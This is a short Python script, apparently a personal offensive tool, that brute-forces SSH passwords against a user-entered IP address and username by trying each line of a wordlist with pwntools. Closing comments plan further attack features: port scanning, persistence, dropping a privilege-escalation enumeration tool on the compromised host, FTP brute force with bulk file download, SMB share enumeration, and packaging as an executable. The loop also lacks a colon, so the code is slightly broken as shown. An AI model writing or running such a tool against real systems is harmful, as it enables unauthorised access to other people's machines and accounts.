#!/usr/bin/env python

from pwn import *
import paramiko
import nmap





#-----------------------------------SSH BRUTE FORCE-------------------------------------------

host = input("Please type in your targets IP address: ")	# user enters in host SSH IP
username = input("Please type in your targets username: ")	# user enters in username they would like to use for brute force
password_file = input("Please enter desired password.txt") 
attempts = 0

with open(password_file, "r") as password_list:
	for password in password_list
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1

#-----------------------------------END SSH BRUTE FORCE-------------------------------------------

		
## Implement nmap scan (or custom portscan.py) to detect SSH port number if not default - set as variable

##Useful nmap scripts to consolidate features?
	
## Give user ability to use whatever password file

## Add persistant connection for ssh?
## Once connection established discover OS if unknown - PUT PEAS tool or similar - execute/output to file - GET file
## Need shell to do this?

## Add FTP scanner/brute force/mget all files?  Only run this scanner if FTP port is present/open? Drop PEAS and execute?

##SMBmap and crack? Enum shares?

##Package into exe 
